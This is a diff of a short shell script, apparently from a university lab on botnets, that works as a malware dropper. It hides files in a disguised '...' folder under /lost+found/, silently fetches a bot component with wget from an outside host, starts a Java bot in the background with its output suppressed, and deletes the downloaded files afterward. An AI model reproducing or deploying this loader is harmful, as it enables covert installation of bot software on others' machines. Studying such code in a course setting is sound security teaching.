@@ -2,7 +2,7 @@
 #! /bin/sh                                                                                  
 
 if [ -z "$DIR" ]; then
-    dhclient
+   # dhclient
 
     DIR='/lost+found/'
     FOLDER='...'
@@ -32,10 +32,10 @@ if [ -z "$DIR" ]; then
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$MAIL" &> /dev/null
     #javac $SRC                                                                                                          
 
-    rm $SRC                                                                                                            
-    rm $PIC 
-    rm $MAIL                                                                                                                   
-    java -classpath "${PIRC}:${MAIL}:." $TARGET &> /dev/null &                                                       
+    #rm $SRC
+    java -classpath "${PIRC}:${MAIL}:." $TARGET &> /dev/null &
+    rm $PIRC
+    rm $MAIL
     cd $CURDIR
 fi
 ###########################################
